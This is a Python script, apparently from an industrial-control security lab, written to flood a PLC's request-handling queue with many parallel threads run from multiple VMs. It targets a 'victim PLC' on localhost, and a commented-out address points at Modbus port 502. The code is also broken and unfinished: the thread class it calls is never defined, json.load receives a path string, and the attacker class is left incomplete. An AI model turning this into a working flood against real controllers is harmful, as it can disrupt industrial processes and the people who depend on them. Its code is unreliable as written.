#-----------------------------------------------------------------------------
# Name:        DDos attacker.py
#
# Purpose:     A simple PLC request sender program try to full fill the target PLC's 
#              request handling queue. This program need to be run on multiple machine
#              with multiple thread. for example run 100 this program parallel 
#              on 10 vms.
#
# Author:      Yuancheng Liu
#
# Created:     2023/10/02
# Version:     v_0.1
# Copyright:   
# License:     
#-----------------------------------------------------------------------------

import os
import sys
import time
import json

print("Current working directory is : %s" % os.getcwd())
DIR_PATH = dirpath = os.path.dirname(__file__)
print("Current source code location : %s" % dirpath)

CONFIG_FILE_NAME = 'ddosAttackCfg.txt'

TOPDIR = 'src'
LIBDIR = 'lib'

#-----------------------------------------------------------------------------
# find the lib directory
idx = dirpath.find(TOPDIR)
gTopDir = dirpath[:idx + len(TOPDIR)] if idx != -1 else dirpath   # found it - truncate right after TOPDIR
# Config the lib folder 
gLibDir = os.path.join(gTopDir, LIBDIR)
if os.path.exists(gLibDir):
    sys.path.insert(0, gLibDir)

# init the config loader
import ConfigLoader
gGonfigPath = os.path.join(dirpath, CONFIG_FILE_NAME)
iConfigLoader = ConfigLoader.ConfigLoader(gGonfigPath, mode='r')
if iConfigLoader is None:
    print("Error: The config file %s is not exist.Program exit!" %str(gGonfigPath))
    exit()
CONFIG_DICT = iConfigLoader.getJson()


#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class DDosAttacker(object):
    
    def __init__(self) -> None:
        self.threadPoolCount = int(CONFIG_DICT['ATK_TN']) if 'ATK_TN' in CONFIG_DICT.keys() else 20
        self.threadPool = []
        self.initThreadPool()

    def initThreadPool(self):
        paramPath = os.path.join(DIR_PATH, CONFIG_DICT['ATK_JSON'])
        paramJson = json.load(paramPath)






#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
def main():
    #hostIp = '10.107.105.7'
    #hostPort = 502
    hostIp = '127.0.0.1'
    hostPort = 504

    print('Try to connect to the target victim PLC: %s' % str(hostIp))
    threadPoolCount = 20
    threadPool = []
    for i in range(threadPoolCount):
        attackTh = attackThread(None, i, hostIp, hostPort, repeatTime=10)
        threadPool.append(attackTh)
    print("Start DDoS attacker")
    for attackTh in threadPool:
        attackTh.start()

#-----------------------------------------------------------------------------
if __name__ == '__main__':
    main()


